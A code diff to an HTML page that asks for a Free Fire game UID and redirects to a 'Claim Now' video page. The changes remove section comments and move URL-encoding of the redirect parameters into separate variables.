@@ -132,7 +132,6 @@
         @keyframes tapPulse { 0% { transform: scale(1); } 50% { transform: scale(0.95); } 100% { transform: scale(1); } }
         @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
         
-        /* ===== FANCY CUSTOM ALERT POPUP ===== */
         .custom-alert-overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -259,7 +258,6 @@
             pointer-events: none;
         }
         
-        /* ===== ERROR PAGE ===== */
         .error-page {
             display: none;
             padding: 20px 0;
@@ -362,7 +360,6 @@
         <h2>Enter Your UID</h2>
         <p class="sub-title">Enter your Free Fire UID to continue</p>
         
-        <!-- Normal UID Input -->
         <div id="normalContent">
             <div class="uid-input-wrapper">
                 <input type="text" id="uidInput" placeholder="Enter UID" maxlength="12" autofocus>
@@ -387,7 +384,6 @@
             </div>
         </div>
         
-        <!-- Error Page -->
         <div class="error-page" id="errorPage">
             <span class="error-icon" id="errorIcon">🚫</span>
             <div class="error-title" id="errorTitle">Link Suspended</div>
@@ -398,7 +394,6 @@
         </div>
     </div>
 
-    <!-- ===== FANCY CUSTOM ALERT POPUP ===== -->
     <div class="custom-alert-overlay" id="customAlert">
         <div class="custom-alert-box">
             <span class="alert-icon">❌</span>
@@ -434,7 +429,6 @@
             } catch (e) {}
         }
         
-        // ===== FANCY ALERT FUNCTIONS =====
         function showCustomAlert() {
             document.getElementById('customAlert').classList.add('show');
             var input = document.getElementById('uidInput');
@@ -582,11 +576,20 @@
                 buttonText = 'Claim Now';
                 headline = '';
             }
+            
+            // FIXED: Properly encode all parameters
+            const videoEncoded = encodeURIComponent(videoUrl);
+            const claimEncoded = encodeURIComponent(claimUrl);
+            const btnEncoded = encodeURIComponent(buttonText);
+            const headlineEncoded = encodeURIComponent(headline);
+            
             localStorage.setItem('videoUrl', videoUrl);
             localStorage.setItem('claimUrl', claimUrl);
             localStorage.setItem('buttonText', buttonText);
             localStorage.setItem('headline', headline);
-            window.location.href = '/v/' + (linkData ? linkData.id : 'default') + '?video=' + encodeURIComponent(videoUrl) + '&claim=' + encodeURIComponent(claimUrl) + '&btn=' + encodeURIComponent(buttonText) + '&headline=' + encodeURIComponent(headline);
+            
+            const linkId = linkData ? linkData.id : 'default';
+            window.location.href = `/v/${linkId}?video=${videoEncoded}&claim=${claimEncoded}&btn=${btnEncoded}&headline=${headlineEncoded}`;
         }
         
         function handleButtonClick(num) {
@@ -607,6 +610,7 @@
                 buttonText = 'Claim Now';
                 headline = '';
             }
+            
             localStorage.setItem('videoUrl', videoUrl);
             localStorage.setItem('claimUrl', claimUrl);
             localStorage.setItem('buttonText', buttonText);
